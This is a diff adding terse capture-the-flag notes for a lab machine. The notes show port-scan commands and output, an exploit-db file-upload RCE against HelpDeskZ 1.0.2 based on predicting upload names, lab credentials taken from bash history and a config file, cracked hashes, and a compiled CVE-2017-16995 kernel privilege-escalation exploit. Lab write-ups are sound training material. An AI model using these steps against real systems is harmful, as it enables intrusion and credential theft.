@@ -1,0 +1,65 @@
+---PORT ENUM---
+*masscan -i tun0 --rate=1000 -p 1-65535 10.10.10.121 > open_ports && nmap -p $(cat open_ports | sed -e 's/[^0-9\/]//g' | sed -e 's/\/.*//g' | sed -e ':a' -e 'N' -e '$!ba' -e 's/\n/,/g') -sV -sC -Pn 10.10.10.121
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
+|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
+|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+3000/tcp open  http    Node.js Express framework
+|_http-title: Site doesn't have a title (application/json; charset=utf-8).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+---GOBUSTER---
+/:80:
+  /support (Status: 301)
+  /javascript (Status: 301)
+  /server-status (Status: 403)
+
+---ATTEMPTS---
+in 10.10.10.121:3000:
+  {"message":"Hi Shiv, To get access please find the credentials with given query"}
+
+searching the gibhub for helpdeskz found UPGRADING.txt file that return a list of bunch of other files but nothing useful but the version 1.0.2. The files are uploaded to /uploads/tickets/.
+
+Using the URCE from exploit-db. This exploit is possible because when a file is uploaded to the site submiting a ticket, the file is indeed uploaded despite the message that return saying otherwise. But the file name is scrambled into a md5 and then appended a localtime to the end before the extension. So, if a request is sent with the md5(filename).SERVERTIME.EXT the file is accessable
+done!
+
+---PRIVESC---
+*cat /home/help/user.txt
+on .bash_history:
+  su
+  su
+  rOOTmEoRdIE
+  su
+  MS'
+  exit
+
+*./linpeas.sh
+  (CRON)@reboot /usr/local/bin/forever start /home/help/help/dist/bundle.js
+  /var/www/html/support/includes/config.php
+  ~/help/dist/bundle.js => 5d3c93182bb20f07b994a7f617e99cff:godhelpmeplz
+
+in config.php:
+  $config['Database']['dbname'] = 'support';
+  $config['Database']['tableprefix'] = '';
+  $config['Database']['servername'] = 'localhost';
+  $config['Database']['username'] = 'root';
+  $config['Database']['password'] = 'helpme';
+  $config['Database']['type'] = 'mysqli';
+
+found two users in support database:
+  helpme@helpme.com c3b3bd1eb5142e29adb0044b16ee4d402d06f9ca:godhelpmeplz
+  lolololol@yopmail.com ec09fa0d0ba74336ea7fe392869adb198242f15a:02ddbe8
+
+using the 2017-16995 for LPE
+this exploit is based on the eBPF (extended/enhanced Berkeley Packet Filter) Verifier. This verifier is supposed to check if the bytecode sended to the eBPF is safe. The problem is that the BFP system_call can be executed by a unprivilleged user while it runs in kernel mode. The problem is that is possible to r/w anywhere in the memory. Then, the exploit just need to change the value of the uid flag and spawn a shell.
+*gcc 44298.c
+*./a.out
+kudos!
+
+*cat /root/root.txt
